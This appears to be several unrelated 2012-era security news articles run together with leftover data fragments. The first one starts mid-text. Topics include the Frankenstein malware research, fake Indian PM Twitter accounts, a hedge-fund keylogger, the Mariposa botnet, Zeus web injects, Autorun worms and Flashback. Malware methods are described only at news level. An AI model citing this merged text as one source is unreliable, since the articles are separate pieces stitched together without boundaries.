The researchers – Vishwath Mohan and Kevin W. Hamlen - are calling the malware 'Frankenstein', after the fictional character of the same name. According to a paper by the duo, Frankenstein changes the game for authors of metamorphic malware who are accustomed to rewriting code so that each variant is different from the last. Instead, Frankenstein uses instructions from non-malicious programs that are considered safe by security programs, which the researchers contend makes it more difficult for \"feature-based malware detectors to reliably use those byte sequences as a signature to detect malware.\" \"The instruction sequence harvesting process leverages recent advances in gadget discovery for return-oriented programming,\" according to a paper the researchers released describing their findings. \"Preliminary tests show that mining just a few local programs is sufficient to provide enough gadgets to implement arbitrary functionality.\" The research was funded in part by the U.S. Air Force Office of Science Research. The two detailed their findings at the 6th USENIX Workshop on Offensive Technologies (WOOT) in Bellevue, WA, earlier this month. \"Rather than recompiling the code purely randomly during propagation, which leads to diverse but potentially distinguishable binary features, our system searches non-malicious programs on the local system for byte sequences that function as the building blocks for semantically equivalent but syntactically new copies,\" the researchers noted in the paper. \"Our experiments showed that mining a few files is both sufficient to obtain high mutant diversity, and fast enough to be a practical mutation strategy.\" \"By creating new copies entirely from byte sequences obtained from benign files,\" the paper continues, \"we argue that it becomes significantly more difficult for defenders to infer adequate signatures that reliably distinguish malware from non-malware on victim systems. In particular, signatures that include feature-whitelisting are less effective against our framework than against more conventional forms of obfuscation.\" The paper can be downloaded here. " }

The government asked the micro-blogging website to remove the accounts on the grounds that they misrepresented the prime minister and risked increasing ethnic or religious tension.  \"Officials at Twitter have told us they are reviewing our request to remove the six fake PM accounts and they intend to cooperate,\" Pankaj Pachauri, Singh's spokesman told AFP.   \"These accounts often feature mischievous, communalist (ethnic or religious) sentiments that can be misconstrued by Twitter users as coming from the prime minister himself,\" he added.   Twitter representatives were not immediately available to comment on Thursday.  The prime minister's official account, @PMOIndia, was opened in January this year and has attracted 176,000 followers.  The request to block the six fake accounts is part of an Internet crackdown by the government following a mass exodus of migrants from the country's northeast who fled southern cities such as Bangalore.  Tens of thousands of people fled back to the remote northeast last week after Internet posts, phone text messages and doctored video clips messages spread rumours that they would be attacked by Muslims.  The government has ordered social networking sites to take down provocative posts, and some online content has been blocked. Bulk text messages sent by mobile phones have also been temporarily banned. " }

Who better to target than the folks who manage lots of money? Barracuda Labs recently detected a spam campaign targeting hedge fund managers, Dave Michmerhuizen and Luis Chapetti, security researchers at Barracuda Networks, wrote Wednesday on the company's Internet Security blog. Like other targeted attacks, the criminals behind this campaign took pains to create an email that would pique the recipient's interest and open the attachment. The pitch in the attack email was short and simple, offering advice about carried interest feed, an account mechanism used by hedge and private equity funds to return income to funds. Lately, its tax status has been under discussion. \"For this reason, any email purporting to have information about carried interest fees is likely to raise the curiosity of financial professionals,\" Michmeerhuizen and Chapetti wrote. Like other targeted attacks, the short email pitch came with an executable file as an attachment. The file, actually a Trojan, had a filename that seemed relevant to financial professionals. However, in this case, attackers were sending an executable, not a PDF or RTF document. Opening and running the attachment, which a user should never do, displays a file that contained actually relevant information, according to the post. While the attachment is open and running, it installs a keylogger in the background.  The keylogger captures keystrokes and later loads them to a remote server using FTP, Michmeerhuizen and Chapetti wrote. Researchers were able to look at all the directory containing all the harvested information on the remote server. Each folder had the name of the computer which had been infected and contained the keylogger files sent from that machine. \"Never trust an attachment sent to you in email, even if the source appears reputable,\" the Barracuda researchers said in the post. The installed security suite on the computer may not be able to detect these attachments as malicious because criminals are going to great lengths to avoid detection. In cases like this, recipients should save the file without running it and send it to the virus scanning service virustotal.com, Michmeerhuizen and Chapetti wrote. The service scans the file against popular security products to figure out whether it is detected by major antivirus and scanning engines. As of today, only 11 out of 42 products, including eSafe, Kaspersky, McAfee, Symantec, and Trend Micro, were able to detect this particular attachment, according to VirusTotal. " }

The suspected mastermind of the botnet, Matjaž Škorjanc, 26, is believed by the authorities to be the hacker known as \"Iserdo.\" Authorities arrested him in Slovenia arrested in 2010. At its height, Mariposa was composed of more than 8 million zombie computers infected with the Butterfly bot (Mariposa is Spanish for butterfly).  In a blog post, Sophos Security Consultant Graham Cluley noted that the hijacked computers were infected with the polymorphic W32/Rimecud family of malware, which spread through a number of means, including copying itself to removable storage devices, instant messaging and P2P file-sharing. \"Once a computer had been compromised and brought into the botnet, operators could steal information from innocent users - including credit card details and banking passwords,\" he blogged. In 2009, an international team researchers and experts formed the Mariposa Working Group (MWG) to take the botnet down. In February of 2010, the Spanish national police arrested three people suspected of being tied to the botnet.  At the time of his arrest, the FBI said Iserdo sold the butterfly bot to cyber-criminals worldwide from 2008 to 2010. These individuals in turn developed networks of infected bots, of which Mariposa was the largest and most notorious. In addition to selling Butterfly Bot, Iserdo also created customized versions for certain customers and sold plug-ins to bolster the botnet's features and functionality. \"In the last two years, the software used to create the Mariposa botnet was sold to hundreds of other criminals, making it one of the most notorious in the world,\" FBI Director Robert S. Mueller, III, said in a statement at the time. \"These cyber intrusions, thefts, and frauds undermine the integrity of the Internet and the businesses that rely on it; they also threaten the privacy and pocketbooks of all who use the Internet.\" " }

Microsoft originally released Attack Surface Analyzer as a public beta in January 2011 during the Blackhat DC security conference. In the year and a half since, the company has reduced the number of false positives, enhanced performance, and made bug fixes, Monty LaRue and Jimmie Lee, Trustworthy Computing Security engineers at Microsoft, wrote on the Security Development Lifecycle blog Thursday. Attack Surface Analyzer 1.0 now has an improved graphical user interface and in-depth documentation, they wrote. The verification tool is designed to help software developers and independent software vendors assess the attack surface of an application or software platform, Tim Rains, director of Microsoft's Trustworthy Computing group, wrote on the Microsoft Security Blog Thursday. Developers and testers can use this to determine if their applications are secure. Since ASA doesn't require the original source code, managers and executives can also use the tool to determine how a new application or software being considered would affect the organization's overall security before deploying it. \"IT Security Auditors can use the tool to evaluate the risk of a particular piece of software installed on the Windows platform during threat risk reviews,\" Rains wrote.  The tool takes snapshots of the system before and after an application was installed, and compares them to identify changes made when new applications were installed. A stand-alone wizard guides users through the scanning and analysis process and a command-line version is available for use with automated tools. The tool also gives an overview of changes to the system that Microsoft considers important to the security of the platform, and it highlights these changes in the attack surface report, LaRue and Lee wrote. The tool analyzes changed or newly added files, registry keys, services, ActiveX Controls, listening ports, access control lists and other parameters. Analyzer does not appear to rely on signatures or try to exploit known vulnerabilities. Instead, it just looks at classes of security weaknesses where programs commonly fall short, or are exposed to attack vectors. The “Security Issues” tab on the highlights specific potential issues such as access control lists (ACLs) that could be problematic. As part of the Software Development Lifecycle to encourage secure software development, Microsoft requires developers to run attack surface validations before releasing Windows applications. The Analyzer provides an overview of the changes so that the development team can define the product's default and maximum attack surface, as required by the SDL.

The news comes from those testing the newest developer preview. Apple has included a new system called OS X Security Update Test 1.0, which will check Apple’s servers daily for the latest security patches. The auto checking can also be set to run each time a Mac restarts, and any updates that are available will be automatically downloaded and installed. The automatic updates are just one of the security enhancements slated for OS X 10.8. Gatekeeper is the other, and it will restrict the installation of downloaded applications based on their source. It comes with three settings: users can opt to allow applications to be installed if they are taken from the Mac App Store; the Mac App Store and Identified Developers; or anywhere on the Web. When Gatekeeper was announced in February, Sophos’ Chester Wisniewski said, Apple’s idea is sound, but the implementation is flawed. “Gatekeeper is essentially a whitelisting technology bolted onto the blacklisting technology it introduced two versions ago. While this will clearly reduce the risk for users who primarily download all of their programs through popular browsers or the App Store, it only addresses the Trojan problem that has been the primary vehicle for delivering malware to OS X,” he explained.   “This one time check, combined with the limitations of what files are scanned from which sources significantly weakens the usefulness of Gatekeeper. The second problem is a common one to all platforms, people. If a user wishes to install something and is blocked from doing so, they more often then not will override the block. It's human nature,” he adds. Yesterday, it was learned that Apple had revamped their marketing for OS X when it comes to Mac-based malware. Flashback, the Mac-based malware that struck in April, led to the creation of a 700,000 node botnet comprised of all Macs. In the end, the malware wasn’t nearly as harmful as some suggested, as it only displayed advertisements – but it did crush the myth of “no viruses on a Mac.” In an apparent response to this, Apple's Mac OS X website stopped promoting the “It doesn’t get PC viruses” claim, altering it to “It’s built to be safe” instead.

The attacks being carried out by the P2P version of Zeus use a basic form of social engineering. Depending on the service being targeted at the time, users are presented with offers for additional security measures and rebates. In the case of Facebook, malware injects the necessary code so that an offer of 20% cash back is displayed. All the user has to do is link their Visa or MasterCard debit card to their Facebook account. Of course that offer is completely fraudulent, but that won’t prevent some people from trying to save a buck unfortunately. The cash back bonus is awarded when the victim purchases Facebook points. The order form will require the card number, expiration, CVV (security code), and PIN.  For Google and Yahoo users, the Zeus variant injects the needed form data and presents an offer of additional security. During this scam, users are told they can opt to authenticate to the 3D Secure service used by the Verified by Visa and MasterCard SecureCode programs. In order to participate, the victims will need to link their debit cards to their webmail account, and all future 3D Secure authentication sessions will be performed via Google Checkout or Yahoo Checkout. “The attack is not compromising the 3D Secure service or authentication mechanism, but rather leveraging the Verified by Visa and MasterCard SecureCode brands to make the scam more credible,” Trusteer explains in a blog post. As for Hotmail, the scam is similar to the one used against Google and Yahoo. Only this time, a 3D Secure-like service is offered. As in the previous attacks, the victim will need to link their debit card to their webmail account. “This attack is a clever example of how fraudsters are using trusted brands, social network/email service providers and debit card providers, to get victim's to put down their guard and surrender their debit card information,” the blog post concluded. “These web injects are well crafted both from a visual and content perspective, making it difficult to identify them as a fraud. It's also ironic how in the Google Mail, Hotmail and Yahoo scams, the fraudsters are using the fear of the very cybercrime they are committing to prey on their victims.” " }

Despite the fact that the Autorun feature was eliminated from operating systems in Windows Vista SP1 in 2008, worms that take advantage of the feature continue to infect systems worldwide. \"The magnitude of this threat -- so many years after it should have disappeared -- is astonishing,\" said Catalin Cosoi, chief security researcher, Bitdefender. \"Some of the heavy-hitters of the virus world, such as Downadup and Stuxnet, spread this way -- prevention should be a simple matter.\" The mass introduction of USB storage devices and the apparition of the Autorun feature in Windows have been widely exploited since the early 2000s. Within five years, Autorun worms reached epidemic proportions autorun-based threats have dominated the malware landscape report since. \"You never know for certain where a USB stick may have been. It is worth making a habit of checking your portable drives,\" said Adina Jipa, product marketing manager at Bitdefender USB. In order to help address the threat, Bitdefender, has released a new version of its USB Immunizer, which helps protect against autorun-related threats. In addition to announcing the tool, the Bucharest, Romania-based firm shared 5 facts about Autorun-based malware: 1 - The Autorun.inf file is not malicious itself. It is used by some families of malware that copy themselves on USB sticks to force the computer to automatically execute them when an infected stick is plugged into a Windows-based PC. 2 - Among the most important families of malware that use the Autorun exploitation to spread are Stuxnet, Downadup, Sality, Rimecud or OnlineGames. 3 - Autorun-based malware can copy itself on MP3/MP4 players, mobile phones, SD cards (such as those in digital cameras) and other devices. When plugged in other PCs, the malware is executed automatically. 4 - Since autorun.inf files are plain-text files that can be opened and analyzed, malware creators obfuscate their creations to make them unreadable by humans. However, this is also their weak point. This degree of obfuscation is uncommon in text files and triggers AV detection. 5 - Trojan.AutorunInf (a detection that intercepts rogue autorun.inf files) has been the number one source of infection for more than three years in a row. During this time, it has helped various malware families infect millions of computers worldwide. Bitdefender USB Immunizer is available here. " }

According to Intego, the new variant continues to use a patched Java vulnerability to infect users. No password is required for it to install, and it places files in the victim’s home folder at the following concerns: • ~/Library/LaunchAgents/com.java.update.plist • ~/.jupdate “It then deletes all files and folders in ~/Library/Caches/Java/cache in order to delete the applet from the infected Mac, and avoid detection or sample recovery,” the company said. “Intego has several samples of this new Flashback variant, which is actively being distributed in the wild.” Just last week, researchers at Symantec claimed the number of Macs infected with Flashback had dropped to 140,000. Since then however, the company has revised its number to put it at more than 600,000 – roughly the same as when the botnet’s existence became widely publicized more than two weeks ago. According to Kaspersky Lab, compromised WordPress sites played a key role in spreading the malware, as they were hosting code that redirected visitors to a malicious server.  “The use of exploits to distribute Flashfake was first detected in February 2012; exploits dating back to 2008 and 2011 were used in those attacks,” Kurt Baumgartner, senior security researcher at Kaspersky Lab, blogged April 19. “Exploitation of the CVE2012-0507 vulnerability was first reported in March 2012. At that point, it was a vulnerability in Mac OS X that remained unpatched, despite the fact that Oracle had released a patch for it in February. This was because Apple never uses patches from Oracle and creates its own patches to close Java vulnerabilities…This practice of releasing patches with delays of about two months is traditional for Apple.” This same vulnerability has been spotted by Symantec being leveraged by another piece of malware referred to as Trojan.Maljava that is targeting both Mac and Windows computers.  “When a victim loads the Java Applet malware, it breaks the Java Applet sandbox by using the CVE-2012-0507 vulnerability,” blogged Takashi Katsuki, threat analyst with Symantec Security Response. “This vulnerability is effective for both Mac and Windows operating systems. Then, if the threat is running on a Mac operating system, it downloads a dropper type malware written in Python. However, if the threat is running on a Windows operating system, it downloads a standard Windows executable file dropper. Both droppers drop a Trojan horse program that opens a back door on the compromised computer.” Ironically, much of the malware on Macintosh computers appears to be targeting Windows, according to a new report by Sophos. One in five of the 100,000 Mac computers the company analyzed were infected with at least one piece of Windows malware. Just one in 36 was infected with malware intended for Mac OS X. While Windows malware won’t cause any problems on Macs that are not also running Windows on the same system, the malware can still be spread to other computers via USB memory sticks and other means. “Some Apple fans might feel relieved that they are seven times more likely to have Windows malware on their Macs than Mac OS X-specific threats, but they shouldn't be,” argued Graham Cluley, senior technology consultant at Sophos. “What Mac users really need to do is protect their computers now…or risk allowing the malware problem on Macs to become as big as the problem on PCs in the future.” " }
